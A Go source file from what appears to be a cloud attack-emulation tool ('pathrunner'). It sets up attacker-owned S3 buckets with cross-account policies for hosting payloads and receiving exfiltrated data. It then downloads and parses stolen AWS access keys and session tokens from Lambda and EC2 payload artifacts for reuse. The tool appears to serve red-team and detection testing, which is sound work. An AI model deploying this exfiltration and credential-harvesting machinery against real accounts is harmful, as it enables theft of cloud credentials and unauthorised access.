// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package attacker

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/s3/types"
	"github.com/aws/aws-sdk-go-v2/service/sts"

	"github.com/DataDog/pathrunner/pkg/modules"
)

// CreateCodeHostingBucket creates an S3 bucket in the attacker account with a
// resource-based policy granting the victim accounts read access. Used by modules
// that need to host payload scripts cross-account (e.g., Glue jobs reading from
// attacker S3). Returns the bucket name.
func CreateCodeHostingBucket(attackerCfg aws.Config, victimAccountIDs []string, region string) (string, error) {
	readPolicy := buildBucketPolicy("AllowVictimRead", victimAccountIDs,
		[]string{"s3:GetObject", "s3:GetBucketLocation", "s3:ListBucket"},
		[]string{"arn:aws:s3:::${BUCKET}", "arn:aws:s3:::${BUCKET}/*"},
	)
	return createBucketWithPolicy(attackerCfg, region, "pathrunner-code", readPolicy)
}

// CreateExfilBucket creates an S3 bucket in the attacker account with a
// resource-based policy granting the victim accounts write access. Used by modules
// whose payloads exfiltrate data to an attacker-controlled bucket. Returns the
// bucket name.
func CreateExfilBucket(attackerCfg aws.Config, victimAccountIDs []string, region string) (string, error) {
	writePolicy := buildBucketPolicy("AllowVictimWrite", victimAccountIDs,
		[]string{"s3:PutObject"},
		[]string{"arn:aws:s3:::${BUCKET}/*"},
	)
	return createBucketWithPolicy(attackerCfg, region, "pathrunner-exfil", writePolicy)
}

// buildBucketPolicy constructs an S3 bucket policy granting the specified actions
// to all victim account roots.
func buildBucketPolicy(sid string, accountIDs []string, actions []string, resources []string) map[string]interface{} {
	principals := make([]string, len(accountIDs))
	for i, accountID := range accountIDs {
		principals[i] = fmt.Sprintf("arn:aws:iam::%s:root", accountID)
	}

	// S3 bucket policies accept a single string or an array for Principal.AWS.
	// Use a string when there's exactly one principal to keep the policy clean.
	var principalValue interface{}
	if len(principals) == 1 {
		principalValue = principals[0]
	} else {
		principalValue = principals
	}

	return map[string]interface{}{
		"Version": "2012-10-17",
		"Statement": []map[string]interface{}{
			{
				"Sid":    sid,
				"Effect": "Allow",
				"Principal": map[string]interface{}{
					"AWS": principalValue,
				},
				"Action":   actions,
				"Resource": resources,
			},
		},
	}
}

// UpdateBucketPolicyForAccounts replaces the bucket's resource policy to grant
// access to the given set of victim account IDs. Called when new victim accounts
// are discovered (e.g., identity add from a new account).
func UpdateBucketPolicyForAccounts(attackerCfg aws.Config, bucketName string, bucketType string, accountIDs []string, region string) error {
	var policy map[string]interface{}
	switch bucketType {
	case "code":
		policy = buildBucketPolicy("AllowVictimRead", accountIDs,
			[]string{"s3:GetObject", "s3:GetBucketLocation", "s3:ListBucket"},
			[]string{
				fmt.Sprintf("arn:aws:s3:::%s", bucketName),
				fmt.Sprintf("arn:aws:s3:::%s/*", bucketName),
			},
		)
	case "exfil":
		policy = buildBucketPolicy("AllowVictimWrite", accountIDs,
			[]string{"s3:PutObject"},
			[]string{fmt.Sprintf("arn:aws:s3:::%s/*", bucketName)},
		)
	default:
		return fmt.Errorf("unknown bucket type: %s", bucketType)
	}

	policyJSON, err := json.Marshal(policy)
	if err != nil {
		return fmt.Errorf("failed to marshal bucket policy: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(attackerCfg, func(o *s3.Options) {
		o.Region = region
	})

	_, err = s3Client.PutBucketPolicy(ctx, &s3.PutBucketPolicyInput{
		Bucket: aws.String(bucketName),
		Policy: aws.String(string(policyJSON)),
	})
	if err != nil {
		return fmt.Errorf("failed to update bucket policy for '%s': %v", bucketName, err)
	}

	return nil
}

// createBucketWithPolicy creates an S3 bucket and applies the given resource policy.
// The policy may use "${BUCKET}" as a placeholder for the generated bucket name.
func createBucketWithPolicy(attackerCfg aws.Config, region string, prefix string, policy map[string]interface{}) (string, error) {
	bucketName, err := generateBucketName(prefix)
	if err != nil {
		return "", fmt.Errorf("failed to generate bucket name: %v", err)
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(attackerCfg, func(o *s3.Options) {
		o.Region = region
	})

	createInput := &s3.CreateBucketInput{
		Bucket: aws.String(bucketName),
	}

	// LocationConstraint is required for all regions except us-east-1
	if region != "us-east-1" {
		createInput.CreateBucketConfiguration = &types.CreateBucketConfiguration{
			LocationConstraint: types.BucketLocationConstraint(region),
		}
	}

	_, err = s3Client.CreateBucket(ctx, createInput)
	if err != nil {
		return "", fmt.Errorf("failed to create bucket '%s': %v", bucketName, err)
	}

	// Substitute the actual bucket name into the policy
	policyJSON, err := json.Marshal(policy)
	if err != nil {
		_, _ = s3Client.DeleteBucket(ctx, &s3.DeleteBucketInput{Bucket: aws.String(bucketName)})
		return "", fmt.Errorf("failed to marshal bucket policy: %v", err)
	}

	resolvedPolicy := replaceBucketPlaceholder(string(policyJSON), bucketName)

	_, err = s3Client.PutBucketPolicy(ctx, &s3.PutBucketPolicyInput{
		Bucket: aws.String(bucketName),
		Policy: aws.String(resolvedPolicy),
	})
	if err != nil {
		_, _ = s3Client.DeleteBucket(ctx, &s3.DeleteBucketInput{Bucket: aws.String(bucketName)})
		return "", fmt.Errorf("failed to set bucket policy: %v", err)
	}

	return bucketName, nil
}

// replaceBucketPlaceholder replaces "${BUCKET}" with the actual bucket name in a policy string.
func replaceBucketPlaceholder(policy string, bucketName string) string {
	result := make([]byte, 0, len(policy))
	placeholder := "${BUCKET}"
	i := 0
	for i < len(policy) {
		if i+len(placeholder) <= len(policy) && policy[i:i+len(placeholder)] == placeholder {
			result = append(result, []byte(bucketName)...)
			i += len(placeholder)
		} else {
			result = append(result, policy[i])
			i++
		}
	}
	return string(result)
}

// UploadPayload uploads content to the attacker S3 bucket.
func UploadPayload(attackerCfg aws.Config, bucket string, key string, content []byte, region string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(attackerCfg, func(o *s3.Options) {
		o.Region = region
	})

	_, err := s3Client.PutObject(ctx, &s3.PutObjectInput{
		Bucket:      aws.String(bucket),
		Key:         aws.String(key),
		Body:        bytes.NewReader(content),
		ContentType: aws.String("application/octet-stream"),
	})
	if err != nil {
		return fmt.Errorf("failed to upload to s3://%s/%s: %v", bucket, key, err)
	}

	return nil
}

// DeleteBucket empties and deletes an attacker S3 bucket.
func DeleteBucket(attackerCfg aws.Config, bucket string, region string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(attackerCfg, func(o *s3.Options) {
		o.Region = region
	})

	// List and delete all objects first
	listOutput, err := s3Client.ListObjectsV2(ctx, &s3.ListObjectsV2Input{
		Bucket: aws.String(bucket),
	})
	if err != nil {
		return fmt.Errorf("failed to list objects in bucket '%s': %v", bucket, err)
	}

	for _, obj := range listOutput.Contents {
		_, err := s3Client.DeleteObject(ctx, &s3.DeleteObjectInput{
			Bucket: aws.String(bucket),
			Key:    obj.Key,
		})
		if err != nil {
			return fmt.Errorf("failed to delete object '%s': %v", aws.ToString(obj.Key), err)
		}
	}

	// Delete the bucket
	_, err = s3Client.DeleteBucket(ctx, &s3.DeleteBucketInput{
		Bucket: aws.String(bucket),
	})
	if err != nil {
		return fmt.Errorf("failed to delete bucket '%s': %v", bucket, err)
	}

	return nil
}

// DeleteObjectsByPrefix deletes all objects under a given prefix in an S3 bucket.
// Used by modules to clean up uploaded artifacts from a shared bucket without
// destroying the bucket itself.
func DeleteObjectsByPrefix(attackerCfg aws.Config, bucket string, prefix string, region string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(attackerCfg, func(o *s3.Options) {
		o.Region = region
	})

	listOutput, err := s3Client.ListObjectsV2(ctx, &s3.ListObjectsV2Input{
		Bucket: aws.String(bucket),
		Prefix: aws.String(prefix),
	})
	if err != nil {
		return fmt.Errorf("failed to list objects with prefix '%s' in bucket '%s': %v", prefix, bucket, err)
	}

	for _, obj := range listOutput.Contents {
		_, err := s3Client.DeleteObject(ctx, &s3.DeleteObjectInput{
			Bucket: aws.String(bucket),
			Key:    obj.Key,
		})
		if err != nil {
			return fmt.Errorf("failed to delete object '%s': %v", aws.ToString(obj.Key), err)
		}
	}

	return nil
}

// GetAccountID retrieves the AWS account ID for the given config.
func GetAccountID(cfg aws.Config) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	stsClient := sts.NewFromConfig(cfg)
	result, err := stsClient.GetCallerIdentity(ctx, &sts.GetCallerIdentityInput{})
	if err != nil {
		return "", fmt.Errorf("failed to get caller identity: %v", err)
	}

	return aws.ToString(result.Account), nil
}

// TrackAttackerBucket creates a CreatedResource for an attacker S3 bucket.
func TrackAttackerBucket(bucketName string, region string, moduleID string) modules.CreatedResource {
	return modules.CreatedResource{
		Type:           "s3_bucket",
		Name:           bucketName,
		ARN:            fmt.Sprintf("arn:aws:s3:::%s", bucketName),
		Region:         region,
		Created:        time.Now(),
		CleanupMethod:  "delete_s3_bucket",
		ModuleID:       moduleID,
		AccountContext: "attacker",
	}
}

// ListExfilArtifacts returns all object keys in the exfil bucket, sorted
// by last-modified (oldest first) so credentials are imported in order.
func ListExfilArtifacts(cfg aws.Config, bucketName string) ([]string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(cfg)
	out, err := s3Client.ListObjectsV2(ctx, &s3.ListObjectsV2Input{
		Bucket: aws.String(bucketName),
	})
	if err != nil {
		return nil, fmt.Errorf("failed to list objects in %s: %v", bucketName, err)
	}

	keys := make([]string, 0, len(out.Contents))
	for _, obj := range out.Contents {
		keys = append(keys, aws.ToString(obj.Key))
	}
	return keys, nil
}

// DownloadExfilArtifact downloads a single object from the exfil bucket and
// returns its raw bytes.
func DownloadExfilArtifact(cfg aws.Config, bucketName, key string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	s3Client := s3.NewFromConfig(cfg)
	out, err := s3Client.GetObject(ctx, &s3.GetObjectInput{
		Bucket: aws.String(bucketName),
		Key:    aws.String(key),
	})
	if err != nil {
		return nil, fmt.Errorf("failed to download %s: %v", key, err)
	}
	defer func() { _ = out.Body.Close() }()

	return io.ReadAll(out.Body)
}

// ParsedArtifact holds the credential data extracted from any exfil/s3 artifact,
// regardless of whether it came from a Lambda or EC2/bash payload.
type ParsedArtifact struct {
	// CallerARN is the STS caller ARN from the artifact, used for deduplication
	// against existing identities. Empty for EC2 artifacts (ARN not in JSON).
	CallerARN       string
	Name            string
	AccessKeyID     string
	SecretAccessKey string
	SessionToken    string
	// IdentityData is the pre-built PATHFINDER_IDENTITY_DATA block when present
	// (Lambda format). Empty for EC2 format — the block is constructed from the
	// credential fields instead.
	IdentityData string
}

// ParseExfilArtifact extracts all credential and identity fields from an exfil
// artifact, handling both the Lambda JSON format (has identity_data + caller_identity)
// and the EC2/bash format (has credentials object + role_name).
func ParseExfilArtifact(content []byte) (*ParsedArtifact, error) {
	var raw struct {
		CallerIdentity struct {
			ARN string `json:"arn"`
		} `json:"caller_identity"`
		IdentityData string `json:"identity_data"`
		RoleName     string `json:"role_name"`
		Credentials  struct {
			AccessKeyID     string `json:"access_key_id"`
			SecretAccessKey string `json:"secret_access_key"`
			SessionToken    string `json:"session_token"`
		} `json:"credentials"`
	}
	if err := json.Unmarshal(content, &raw); err != nil {
		return nil, fmt.Errorf("failed to parse artifact JSON: %v", err)
	}

	// Lambda format: pre-built identity block + caller ARN
	if raw.IdentityData != "" {
		return &ParsedArtifact{
			CallerARN:    raw.CallerIdentity.ARN,
			IdentityData: raw.IdentityData,
		}, nil
	}

	// EC2/bash format: construct identity block from raw credential fields
	if raw.Credentials.AccessKeyID == "" || raw.Credentials.SecretAccessKey == "" {
		return nil, fmt.Errorf("artifact contains no usable credential data")
	}

	name := "ec2-role"
	if raw.RoleName != "" {
		name = "ec2-role/" + raw.RoleName
	}

	var block strings.Builder
	block.WriteString("--- PATHFINDER_IDENTITY_DATA ---\n")
	fmt.Fprintf(&block, "NAME=%s\n", name)
	block.WriteString("TYPE=keys\n")
	fmt.Fprintf(&block, "ACCESS_KEY_ID=%s\n", raw.Credentials.AccessKeyID)
	fmt.Fprintf(&block, "SECRET_ACCESS_KEY=%s\n", raw.Credentials.SecretAccessKey)
	if raw.Credentials.SessionToken != "" {
		fmt.Fprintf(&block, "SESSION_TOKEN=%s\n", raw.Credentials.SessionToken)
	}
	block.WriteString("AUTO_SWITCH=false\n")
	block.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---")

	return &ParsedArtifact{
		Name:            name,
		AccessKeyID:     raw.Credentials.AccessKeyID,
		SecretAccessKey: raw.Credentials.SecretAccessKey,
		SessionToken:    raw.Credentials.SessionToken,
		IdentityData:    block.String(),
	}, nil
}

// ExtractIdentityDataFromArtifact parses an exfil/s3 JSON artifact and returns
// a PATHFINDER_IDENTITY_DATA block suitable for handleStructuredIdentityData.
//
// Two formats are supported:
//   - Lambda format: artifact has an "identity_data" field already containing the
//     PATHFINDER_IDENTITY_DATA block (written by pkg/payloads/lambda/exfil_s3.go)
//   - EC2/bash format: artifact has a "credentials" object with access_key_id,
//     secret_access_key, session_token and a top-level "role_name" field
//     (written by pkg/payloads/ec2/exfil_s3.go)
func ExtractIdentityDataFromArtifact(content []byte) (string, error) {
	var artifact struct {
		IdentityData string `json:"identity_data"`
		RoleName     string `json:"role_name"`
		Credentials  struct {
			AccessKeyID     string `json:"access_key_id"`
			SecretAccessKey string `json:"secret_access_key"`
			SessionToken    string `json:"session_token"`
		} `json:"credentials"`
	}
	if err := json.Unmarshal(content, &artifact); err != nil {
		return "", fmt.Errorf("failed to parse artifact JSON: %v", err)
	}

	// Lambda format: pre-built identity block
	if artifact.IdentityData != "" {
		return artifact.IdentityData, nil
	}

	// EC2/bash format: construct identity block from raw credential fields
	if artifact.Credentials.AccessKeyID == "" || artifact.Credentials.SecretAccessKey == "" {
		return "", fmt.Errorf("artifact contains no usable credential data")
	}

	name := "ec2-role"
	if artifact.RoleName != "" {
		name = "ec2-role/" + artifact.RoleName
	}

	var block strings.Builder
	block.WriteString("--- PATHFINDER_IDENTITY_DATA ---\n")
	fmt.Fprintf(&block, "NAME=%s\n", name)
	block.WriteString("TYPE=keys\n")
	fmt.Fprintf(&block, "ACCESS_KEY_ID=%s\n", artifact.Credentials.AccessKeyID)
	fmt.Fprintf(&block, "SECRET_ACCESS_KEY=%s\n", artifact.Credentials.SecretAccessKey)
	if artifact.Credentials.SessionToken != "" {
		fmt.Fprintf(&block, "SESSION_TOKEN=%s\n", artifact.Credentials.SessionToken)
	}
	block.WriteString("AUTO_SWITCH=false\n")
	block.WriteString("--- END_PATHFINDER_IDENTITY_DATA ---")
	return block.String(), nil
}

// RawCredentials holds the raw credential fields extracted from a PATHFINDER_IDENTITY_DATA block.
type RawCredentials struct {
	AccessKeyID     string
	SecretAccessKey string
	SessionToken    string
}

// ExtractCredentialsFromIdentityData parses the key=value pairs inside a
// PATHFINDER_IDENTITY_DATA block and returns the access key fields. Returns nil
// if any required field is missing.
func ExtractCredentialsFromIdentityData(identityData string) *RawCredentials {
	creds := &RawCredentials{}
	for _, line := range strings.Split(identityData, "\n") {
		parts := strings.SplitN(line, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, value := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
		switch key {
		case "ACCESS_KEY_ID":
			creds.AccessKeyID = value
		case "SECRET_ACCESS_KEY":
			creds.SecretAccessKey = value
		case "SESSION_TOKEN":
			creds.SessionToken = value
		}
	}
	if creds.AccessKeyID == "" || creds.SecretAccessKey == "" {
		return nil
	}
	return creds
}

func generateBucketName(prefix string) (string, error) {
	randomBytes := make([]byte, 4)
	if _, err := rand.Read(randomBytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("%s-%s", prefix, hex.EncodeToString(randomBytes)), nil
}
